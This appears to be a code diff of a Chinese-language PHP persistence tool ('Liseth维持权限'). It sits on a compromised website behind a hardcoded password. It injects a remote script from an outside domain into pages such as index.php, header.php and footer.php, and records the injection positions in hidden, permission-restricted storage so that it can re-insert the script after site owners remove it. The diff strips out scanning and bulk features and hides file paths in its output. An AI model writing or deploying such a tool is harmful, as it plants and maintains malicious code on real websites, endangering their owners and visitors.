@@ -4,7 +4,7 @@ header('Content-Type: text/html; charset=utf-8');
 // 配置
 $ACCESS_PASSWORD = "admin123";
 $TARGET_SCRIPT = '<script type="text/javascript" src="http://m.993113.com/xhxh.js"></script>';
-$STORAGE_DIR = $_SERVER['DOCUMENT_ROOT'] . '/.cache/';
+$STORAGE_DIR = __DIR__ . '/.cache/'; // 隐藏目录存储位置信息
 
 // 权限检查
 if (!isset($_GET['auth']) || $_GET['auth'] !== $ACCESS_PASSWORD) {
@@ -15,74 +15,13 @@ if (!isset($_GET['auth']) || $_GET['auth'] !== $ACCESS_PASSWORD) {
 // 初始化存储系统
 initStorageSystem();
 
-// 获取文件路径 - 增强版路径解析
+// 获取文件路径
 $filePath = '';
-$fileIdentifier = ''; // 文件唯一标识符
 if (isset($_GET['s'])) {
-    $filePath = parseFilePath($_GET['s']);
-    $fileIdentifier = generateFileIdentifier($filePath);
+    $filePath = str_replace(['../', './'], '', $_GET['s']);
+    $filePath = dirname(__FILE__) . '/' . ltrim($filePath, '/');
 } elseif (isset($_POST['file_path'])) {
-    $filePath = parseFilePath($_POST['file_path']);
-    $fileIdentifier = generateFileIdentifier($filePath);
-}
-
-// 生成文件唯一标识符（用于区分同名文件）
-function generateFileIdentifier($filePath) {
-    // 使用相对路径作为标识符，避免绝对路径暴露服务器结构
-    $docRoot = $_SERVER['DOCUMENT_ROOT'];
-    $relativePath = str_replace($docRoot, '', $filePath);
-    $relativePath = ltrim($relativePath, '/');
-    
-    // 如果无法获取相对路径，使用MD5作为备用方案
-    if (empty($relativePath) || $relativePath === $filePath) {
-        return md5($filePath);
-    }
-    
-    return $relativePath;
-}
-
-// 修正的文件路径解析函数
-function parseFilePath($inputPath) {
-    // 移除可能的危险字符
-    $cleanPath = str_replace(['../', './', '..\\', '.\\'], '', $inputPath);
-    
-    // 如果已经是绝对路径且文件存在，直接返回
-    if (file_exists($cleanPath) && is_file($cleanPath)) {
-        return $cleanPath;
-    }
-    
-    $docRoot = $_SERVER['DOCUMENT_ROOT'];
-    $docRoot = rtrim($docRoot, '/');
-    
-    // 处理不同形式的路径输入
-    $possiblePaths = [];
-    
-    // 1. 直接相对于文档根目录
-    $possiblePaths[] = $docRoot . '/' . ltrim($cleanPath, '/');
-    
-    // 2. 如果输入是绝对路径但在文档根目录外，尝试在文档根目录内查找
-    if (strpos($cleanPath, $docRoot) === 0) {
-        $possiblePaths[] = $cleanPath;
-    }
-    
-    // 3. 处理子目录情况（如 "subdir/index.php"）
-    $possiblePaths[] = $docRoot . '/' . $cleanPath;
-    
-    // 4. 处理多级子目录（如 "dir1/dir2/index.php"）
-    $pathParts = explode('/', $cleanPath);
-    $fileName = array_pop($pathParts);
-    $dirPath = implode('/', $pathParts);
-    $possiblePaths[] = $docRoot . '/' . $dirPath . '/' . $fileName;
-    
-    // 查找第一个存在的文件
-    foreach ($possiblePaths as $testPath) {
-        if (file_exists($testPath) && is_file($testPath)) {
-            return realpath($testPath);
-        }
-    }
-    
-    // 如果都找不到，返回最可能的路径（用于创建新文件）
-    return $docRoot . '/' . ltrim($cleanPath, '/');
+    $filePath = $_POST['file_path'];
 }
 
 // 处理操作
@@ -118,12 +57,6 @@ if (isset($_POST['action'])) {
         case 'backup_storage':
             backupStorage();
             break;
-        case 'scan_directory':
-            scanDirectoryForFiles();
-            break;
-        case 'bulk_operation':
-            handleBulkOperation();
-            break;
     }
 }
 
@@ -140,6 +73,14 @@ function initStorageSystem() {
     $indexFile = $STORAGE_DIR . 'index.dat';
     if (!file_exists($indexFile)) {
         file_put_contents($indexFile, serialize([]));
+    }
+    
+    // 设置目录权限（隐藏）
+    if (is_dir($STORAGE_DIR)) {
+        // 在Unix系统上设置隐藏属性
+        if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
+            @chmod($STORAGE_DIR, 0700);
+        }
     }
 }
 
@@ -160,9 +101,9 @@ function generateRandomDirectory() {
         $STORAGE_DIR . 'cache/',
         $STORAGE_DIR . 'logs/',
         $STORAGE_DIR . 'sessions/',
-        $_SERVER['DOCUMENT_ROOT'] . '/tmp/',
-        $_SERVER['DOCUMENT_ROOT'] . '/cache/',
-        $_SERVER['DOCUMENT_ROOT'] . '/logs/'
+        __DIR__ . '/../tmp/',
+        __DIR__ . '/../cache/',
+        __DIR__ . '/../logs/'
     ];
     
     $randomDir = $dirs[array_rand($dirs)];
@@ -261,7 +202,7 @@ function saveScriptPosition($file) {
     global $TARGET_SCRIPT;
     
     if (!file_exists($file)) {
-        echo "<div class='error'>文件不存在: " . htmlspecialchars($file) . "</div>";
+        echo "<div class='error'>文件不存在</div>";
         return;
     }
     
@@ -272,29 +213,27 @@ function saveScriptPosition($file) {
         $lineNumber = substr_count(substr($content, 0, $pos), "\n") + 1;
         
         // 构建位置信息
-        $fileIdentifier = generateFileIdentifier($file);
+        $fileHash = md5($file);
         $positionData = [
             'file' => $file,
-            'file_identifier' => $fileIdentifier, // 使用唯一标识符
-            'relative_path' => $fileIdentifier,   // 相对路径用于显示
             'position' => $pos,
             'line' => $lineNumber,
             'saved_at' => date('Y-m-d H:i:s'),
             'content_before' => substr($content, max(0, $pos - 30), 30),
             'content_after' => substr($content, $pos + strlen($TARGET_SCRIPT), 30),
-            'file_hash' => md5($file)
+            'file_hash' => $fileHash
         ];
         
         // 读取现有位置
         $positions = readStoredPositions();
-        $positions[$fileIdentifier] = $positionData; // 使用标识符作为键
+        $positions[$fileHash] = $positionData;
         
         // 保存到存储文件
         if (savePositionsToStorage($positions)) {
             $storageFile = getCurrentStorageFile();
             echo "<div class='success'>";
             echo "✅ 脚本位置已保存到隐蔽存储！<br>";
-            echo "<strong>文件:</strong> " . $fileIdentifier . "<br>";
+            echo "<strong>文件:</strong> " . basename($file) . "<br>";
             echo "<strong>位置:</strong> 第 {$lineNumber} 行<br>";
             echo "<strong>存储文件:</strong> " . basename($storageFile) . "<br>";
             echo "<strong>存储路径:</strong> " . dirname($storageFile);
@@ -312,14 +251,14 @@ function autoRestoreScript($file) {
     global $TARGET_SCRIPT;
     
     if (!file_exists($file)) {
-        echo "<div class='error'>文件不存在: " . htmlspecialchars($file) . "</div>";
+        echo "<div class='error'>文件不存在</div>";
         return;
     }
     
     // 从存储文件获取位置信息
     $positions = readStoredPositions();
-    $fileIdentifier = generateFileIdentifier($file);
-    $positionInfo = isset($positions[$fileIdentifier]) ? $positions[$fileIdentifier] : null;
+    $fileHash = md5($file);
+    $positionInfo = isset($positions[$fileHash]) ? $positions[$fileHash] : null;
     
     if (!$positionInfo) {
         echo "<div class='warning'>⚠ 未找到该文件的保存位置，使用智能恢复</div>";
@@ -355,7 +294,6 @@ function autoRestoreScript($file) {
             $storageFile = getCurrentStorageFile();
             echo "<div class='success'>";
             echo "✅ 脚本已恢复到原位置！<br>";
-            echo "<strong>文件:</strong> " . $positionInfo['relative_path'] . "<br>";
             echo "<strong>位置:</strong> 第 {$positionInfo['line']} 行<br>";
             echo "<strong>原保存时间:</strong> {$positionInfo['saved_at']}<br>";
             echo "<strong>数据来源:</strong> " . basename($storageFile);
@@ -463,112 +401,6 @@ function backupStorage() {
     }
 }
 
-// 扫描目录查找文件
-function scanDirectoryForFiles() {
-    $scanDir = isset($_POST['scan_dir']) ? $_POST['scan_dir'] : '';
-    $filePattern = isset($_POST['file_pattern']) ? $_POST['file_pattern'] : '*.php';
-    
-    if (empty($scanDir)) {
-        $scanDir = $_SERVER['DOCUMENT_ROOT'];
-    }
-    
-    $scanDir = parseFilePath($scanDir);
-    
-    if (!is_dir($scanDir)) {
-        echo "<div class='error'>目录不存在: " . htmlspecialchars($scanDir) . "</div>";
-        return;
-    }
-    
-    $files = [];
-    $iterator = new RecursiveIteratorIterator(
-        new RecursiveDirectoryIterator($scanDir, RecursiveDirectoryIterator::SKIP_DOTS),
-        RecursiveIteratorIterator::SELF_FIRST
-    );
-    
-    foreach ($iterator as $file) {
-        if ($file->isFile()) {
-            $filename = $file->getFilename();
-            if (fnmatch($filePattern, $filename) || strpos($filename, $filePattern) !== false) {
-                $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $file->getPathname());
-                $relativePath = ltrim($relativePath, '/');
-                $files[] = [
-                    'path' => $file->getPathname(),
-                    'relative' => $relativePath ?: $filename,
-                    'size' => $file->getSize(),
-                    'modified' => date('Y-m-d H:i:s', $file->getMTime())
-                ];
-            }
-        }
-    }
-    
-    echo "<div class='section'>";
-    echo "<h3>📁 文件扫描结果</h3>";
-    echo "<p><strong>扫描目录:</strong> " . htmlspecialchars($scanDir) . "</p>";
-    echo "<p><strong>找到文件:</strong> " . count($files) . " 个</p>";
-    
-    if (!empty($files)) {
-        echo "<div class='file-list'>";
-        foreach ($files as $file) {
-            echo "<div class='file-item'>";
-            echo "<strong>" . htmlspecialchars($file['relative']) . "</strong><br>";
-            echo "<small>大小: " . round($file['size'] / 1024, 2) . " KB, 修改: " . $file['modified'] . "</small>";
-            echo "<div class='action-buttons'>";
-            echo "<a href='?auth=" . $GLOBALS['ACCESS_PASSWORD'] . "&s=" . urlencode($file['relative']) . "' class='btn btn-small'>选择</a>";
-            echo "<form method='post' style='display:inline;'>";
-            echo "<input type='hidden' name='file_path' value='" . htmlspecialchars($file['path']) . "'>";
-            echo "<button type='submit' name='action' value='check' class='btn btn-small'>检查</button>";
-            echo "</form>";
-            echo "</div>";
-            echo "</div>";
-        }
-        echo "</div>";
-    } else {
-        echo "<div class='warning'>未找到匹配的文件</div>";
-    }
-    echo "</div>";
-}
-
-// 批量操作处理
-function handleBulkOperation() {
-    if (!isset($_POST['bulk_files']) || empty($_POST['bulk_files'])) {
-        echo "<div class='error'>未选择文件</div>";
-        return;
-    }
-    
-    $operation = isset($_POST['bulk_operation_type']) ? $_POST['bulk_operation_type'] : 'check';
-    $files = $_POST['bulk_files'];
-    
-    echo "<div class='section'>";
-    echo "<h3>🔄 批量操作结果</h3>";
-    echo "<p><strong>操作类型:</strong> " . htmlspecialchars($operation) . "</p>";
-    echo "<p><strong>处理文件数:</strong> " . count($files) . "</p>";
-    
-    foreach ($files as $filePath) {
-        $filePath = parseFilePath($filePath);
-        echo "<div class='file-result'>";
-        echo "<h4>📄 " . generateFileIdentifier($filePath) . "</h4>";
-        
-        switch ($operation) {
-            case 'check':
-                checkScript($filePath);
-                break;
-            case 'save_position':
-                saveScriptPosition($filePath);
-                break;
-            case 'auto_restore':
-                autoRestoreScript($filePath);
-                break;
-            case 'restore':
-                restoreScript($filePath);
-                break;
-        }
-        
-        echo "</div>";
-    }
-    
-    echo "</div>";
-}
-
 // 显示位置管理
 function displayPositionManagement() {
     $positions = readStoredPositions();
@@ -585,13 +417,13 @@ function displayPositionManagement() {
         echo "<div class='success'>✅ 当前已存储 " . count($positions) . " 个文件的位置信息</div>";
         echo "<div class='position-list'>";
         
-        foreach ($positions as $fileIdentifier => $info) {
-            $displayPath = isset($info['relative_path']) ? $info['relative_path'] : basename($info['file']);
+        foreach ($positions as $fileHash => $info) {
+            $shortPath = basename($info['file']);
             echo "<div class='position-item'>";
-            echo "<strong>{$displayPath}</strong> - 第 {$info['line']} 行";
+            echo "<strong>{$shortPath}</strong> - 第 {$info['line']} 行";
             echo "<br><small>保存于: {$info['saved_at']}</small>";
             echo "<br><div class='action-buttons'>";
-            echo "<a href='?auth={$GLOBALS['ACCESS_PASSWORD']}&s={$displayPath}' class='btn btn-small'>检查</a>";
+            echo "<a href='?auth={$GLOBALS['ACCESS_PASSWORD']}&s={$shortPath}' class='btn btn-small'>检查</a>";
             echo "<form method='post' style='display:inline;'>";
             echo "<input type='hidden' name='file_path' value='{$info['file']}'>";
             echo "<button type='submit' name='action' value='auto_restore' class='btn btn-small btn-success'>自动恢复</button>";
@@ -623,8 +455,6 @@ function displayPositionManagement() {
     echo "🗑️ 清除所有";
     echo "</button>";
     echo "</form>";
-    
-    echo "<button type='button' onclick='showScan()' class='btn btn-info'>🔍 扫描文件</button>";
     echo "</div>";
     
     // 导入表单
@@ -633,17 +463,6 @@ function displayPositionManagement() {
     echo "<label><strong>导入位置数据:</strong></label><br>";
     echo "<textarea name='import_data' style='width:100%; height:80px;' placeholder='粘贴导出的位置代码...'></textarea><br>";
     echo "<button type='submit' name='action' value='import_positions' class='btn btn-success'>确认导入</button>";
-    echo "</form>";
-    echo "</div>";
-    
-    // 文件扫描表单
-    echo "<div id='scanForm' style='display:none; margin-top:15px;'>";
-    echo "<form method='post'>";
-    echo "<label><strong>扫描目录:</strong></label><br>";
-    echo "<input type='text' name='scan_dir' value='' style='width:300px;' placeholder='留空则扫描整个网站'>";
-    echo "<br><label><strong>文件模式:</strong></label><br>";
-    echo "<input type='text' name='file_pattern' value='index.php' style='width:300px;' placeholder='例如: index.php, *.html, header.*'>";
-    echo "<br><button type='submit' name='action' value='scan_directory' class='btn btn-success'>开始扫描</button>";
     echo "</form>";
     echo "</div>";
     
@@ -664,15 +483,14 @@ function checkScript($file) {
     
     // 检查是否有保存的位置信息
     $positions = readStoredPositions();
-    $fileIdentifier = generateFileIdentifier($file);
-    $savedPosition = isset($positions[$fileIdentifier]) ? $positions[$fileIdentifier] : null;
+    $fileHash = md5($file);
+    $savedPosition = isset($positions[$fileHash]) ? $positions[$fileHash] : null;
     
     if ($pos !== false) {
         $lineNumber = substr_count(substr($content, 0, $pos), "\n") + 1;
         
         echo "<div class='success'>";
         echo "✅ 脚本存在于文件中<br>";
-        echo "<strong>文件:</strong> " . $fileIdentifier . "<br>";
         echo "<strong>位置:</strong> 第 {$lineNumber} 行";
         
         if ($savedPosition) {
@@ -688,8 +506,7 @@ function checkScript($file) {
         
     } else {
         echo "<div class='warning'>";
-        echo "⚠ 脚本不存在于文件中<br>";
-        echo "<strong>文件:</strong> " . $fileIdentifier;
+        echo "⚠ 脚本不存在于文件中";
         
         if ($savedPosition) {
             echo "<br><strong>已保存位置:</strong> 第 {$savedPosition['line']} 行 (保存于 {$savedPosition['saved_at']})";
@@ -703,7 +520,7 @@ function restoreScript($file) {
     global $TARGET_SCRIPT;
     
     if (!file_exists($file)) {
-        echo "<div class='error'>文件不存在: " . htmlspecialchars($file) . "</div>";
+        echo "<div class='error'>文件不存在</div>";
         return;
     }
     
@@ -746,7 +563,6 @@ function restoreScript($file) {
     if (file_put_contents($file, $newContent) !== false) {
         echo "<div class='success'>";
         echo "✅ 脚本恢复成功！<br>";
-        echo "<strong>文件:</strong> " . generateFileIdentifier($file) . "<br>";
         echo "<strong>插入位置:</strong> {$insertLocation}";
         echo "</div>";
         
@@ -764,7 +580,7 @@ function restoreScript($file) {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Liseth维持权限 - 多文件区分版</title>
+    <title>Liseth维持权限 - 隐蔽存储版</title>
     <style>
         body { 
             font-family: Arial, sans-serif; 
@@ -868,25 +684,18 @@ function restoreScript($file) {
             flex-wrap: wrap;
             margin: 15px 0;
         }
-        .position-list, .file-list {
+        .position-list {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
             gap: 15px;
             margin-top: 15px;
         }
-        .position-item, .file-item {
+        .position-item {
             background: white;
             padding: 15px;
             border: 1px solid #e1e4e8;
             border-radius: 4px;
             box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-        }
-        .file-result {
-            margin: 15px 0;
-            padding: 15px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            background: #f9f9f9;
         }
         .storage-info {
             background: #e8f5e8;
@@ -895,61 +704,26 @@ function restoreScript($file) {
             margin: 10px 0;
             border-left: 4px solid #4caf50;
         }
-        .bulk-operations {
-            background: #fff3cd;
-            padding: 15px;
-            border-radius: 4px;
-            margin: 15px 0;
-        }
     </style>
     <script>
         function showImport() {
             document.getElementById('importForm').style.display = 'block';
-            document.getElementById('scanForm').style.display = 'none';
         }
         
-        function showScan() {
-            document.getElementById('scanForm').style.display = 'block';
-            document.getElementById('importForm').style.display = 'none';
-        }
-        
-        function showCustomFileInput() {
-            document.getElementById('customFileForm').style.display = 'block';
-        }
-        
-        function toggleBulkSelection(source) {
-            var checkboxes = document.querySelectorAll('input[name="bulk_files[]"]');
-            for (var i = 0; i < checkboxes.length; i++) {
-                checkboxes[i].checked = source.checked;
-            }
+        function showStorageInfo() {
+            document.getElementById('storageInfo').style.display = 'block';
         }
     </script>
 </head>
 <body>
     <div class='container'>
-        <h1>🔒 安全脚本恢复工具 - 多文件区分版</h1>
+        <h1>🔒 安全脚本恢复工具 - 隐蔽存储版</h1>
         
         <div class='section'>
             <h2>📁 目标文件</h2>
             <div class='file-info'>
-                <strong>当前文件:</strong> <?php echo htmlspecialchars($filePath ? generateFileIdentifier($filePath) : '未选择'); ?><br>
+                <strong>当前文件:</strong> <?php echo htmlspecialchars($filePath ? basename($filePath) : '未选择'); ?><br>
                 <strong>完整路径:</strong> <?php echo htmlspecialchars($filePath ?: '请选择文件'); ?>
-            </div>
-            
-            <div class='action-buttons'>
-                <button type='button' onclick='showCustomFileInput()' class='btn'>📝 手动输入文件路径</button>
-                <button type='button' onclick='showScan()' class='btn'>🔍 扫描目录文件</button>
-            </div>
-            
-            <div id='customFileForm' style='display:none; margin-top:15px;'>
-                <form method='get'>
-                    <input type='hidden' name='auth' value='<?php echo $ACCESS_PASSWORD; ?>'>
-                    <label><strong>输入文件路径（相对于网站根目录）:</strong></label><br>
-                    <input type='text' name='s' value='index.php' style='width:300px; padding:8px;' 
-                           placeholder='例如: index.php 或 subdir/file.html'>
-                    <button type='submit' class='btn'>加载文件</button>
-                    <br><small>提示: 输入相对于网站根目录的路径</small>
-                </form>
             </div>
             
             <?php if (!empty($filePath)): ?>
@@ -1005,12 +779,9 @@ function restoreScript($file) {
             <div class='action-buttons'>
                 <a href='?auth=<?php echo $ACCESS_PASSWORD; ?>&s=index.php' class='btn'>index.php</a>
                 <a href='?auth=<?php echo $ACCESS_PASSWORD; ?>&s=index.html' class='btn'>index.html</a>
-                <a href='?auth=<?php echo $ACCESS_PASSWORD; ?>&s=wp-content/themes/theme-name/index.php' class='btn'>主题index.php</a>
-                <a href='?auth=<?php echo $ACCESS_PASSWORD; ?>&s=wp-content/themes/theme-name/header.php' class='btn'>主题header.php</a>
-                <a href='?auth=<?php echo $ACCESS_PASSWORD; ?>&s=wp-content/themes/theme-name/footer.php' class='btn'>主题footer.php</a>
-                <a href='?auth=<?php echo $ACCESS_PASSWORD; ?>&s=wp-config.php' class='btn'>wp-config.php</a>
+                <a href='?auth=<?php echo $ACCESS_PASSWORD; ?>&s=header.php' class='btn'>header.php</a>
+                <a href='?auth=<?php echo $ACCESS_PASSWORD; ?>&s=footer.php' class='btn'>footer.php</a>
             </div>
-            <p><small>提示: 不同目录下的同名文件会使用相对路径进行区分</small></p>
         </div>
     </div>
 </body>
